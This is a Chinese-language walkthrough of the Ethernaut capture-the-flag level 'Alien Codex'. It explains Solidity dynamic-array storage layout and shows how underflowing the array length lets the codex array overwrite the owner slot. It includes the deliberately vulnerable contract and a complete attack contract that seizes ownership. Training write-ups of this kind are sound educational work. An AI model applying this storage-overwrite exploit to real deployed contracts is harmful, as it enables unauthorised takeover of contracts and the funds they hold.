# Level 19 - Alien Codex
## 題目
[Alien Codex](https://ethernaut.openzeppelin.com/level/0x0BC04aa6aaC163A6B3667636D798FA053D43BD11)

### 通關條件
你揭開了一個 Alien 合約，宣告你的所有權來完成這一關。
### 提示
- 研究陣列是如何在 storage 中運作的
- 研究 ABI specifications
- 使用一個非常 狡詐 的手段
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
contract `Ownable` 太長，只節錄重點部分：
```solidity=
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;
```
## 解題
### 研究陣列是如何在 storage 中運作的
動態陣列在 storage 中的儲存方式跟靜態的不一樣，因為靜態的可以事先知道長度，所以會循序加入。動態的則是會按照會在宣告的位置儲存陣列的長度，而陣列實際儲存的位置則是在 `Keccak256(slot index)`，舉例來說：
```solidity
bytes32 public test1;
bytes32 public test2;
bytes32[] public test3;
bytes32 public test4;
```
| slot idx | (type)Variable | 
| ------| --------        |
| 0     | (bytes32) `test1`    |
| 1     | (bytes32) `test2`    |
| 2     | 陣列`test3`的長度|
| 3     | (bytes32) `test4`    |
| ⋮     |  ⋮   |
|   Keccak256(2)   | `test3[0]` |

關於 storage 的儲存方式也可以參考 [What is Smart Contract Storage Layout?](https://docs.alchemy.com/docs/smart-contract-storage-layout)

---

這題特意用舊版的 Solidity，代表是現在已經修掉的 bug。題目要求獲得合約所有權，
變數一共有三個，分別是從 `Ownable` 繼承來的：
1. `address private _owner`

和合約自己本身的：

2. `bool public contact`
3. `bytes32[] public codex`

function 的部分一共有四個，除了第 1 個之外，都是控制陣列 `codex` 的，分別是新增資料（19 行）、刪減長度達到刪除最後一筆資料（23 行）和 27 行的修改陣列中的值。
透過合約的功能我們可以推斷，這題應該是要修改陣列 `codex` 以達到將 owner 改成自己，在 [Level 5 - Token](https://hackmd.io/@D13/ethernaut5) 有提到過關於變數 overflow 的問題，這題也是一樣的概念：
1. 使用 `retract()` 讓 size 從 0 減為 $2^{256}-1$，
在 [Level 8 - Vault](https://hackmd.io/@D13/ethernaut8) 中有提到過，一個合約只有 $2^{256}-1$ 個 storage slot，每個 storage 的長度為 bytes32，所以當 `codex` 的長度等於 $2^{256}-1$ 時，代表它覆蓋了整個 slot 了
2. 再來計算 `codex` 的第幾格會剛好等於 `owner` 的位置  

| slot idx | (type)Variable | 
| ------| --------        |
| 0     | (bytes20) `_owner`, (bool) `contact`  |
| 1     | (bytes32) `length(codex)`|
| ⋮     |  ⋮   |
|   Keccak256(1)   | `codex[0]` |
|   Keccak256(1) + 1   | `codex[1]` |
| ⋮     |  ⋮   |
| $2^{256}-2$     |  `codex[2^256-2-Keccak256(1)]`   |
| $2^{256}-1$     |  `codex[2^256-1-Keccak256(1)]`   |

從上表可以推算，slot 0 = `codex[2^256-1-Keccak256(1)]+1`，攻擊合約如下（呼叫 `retract()` 前要先呼叫 `makeContact()` 讓 `contact = true`，否則 `retract()` 會失敗，可見關卡程式碼 23->10->15 行來確認）
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../src/Ethernaut Challenge/19_AlienCodex.sol";

contract AlienAttack {
    AlienCodex level19 = AlienCodex(your_challenge_address);

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(your_wallet_address)));
        level19.makeContact();
        level19.retract();
        level19.revise(index, myAddress);
    }
} 
```


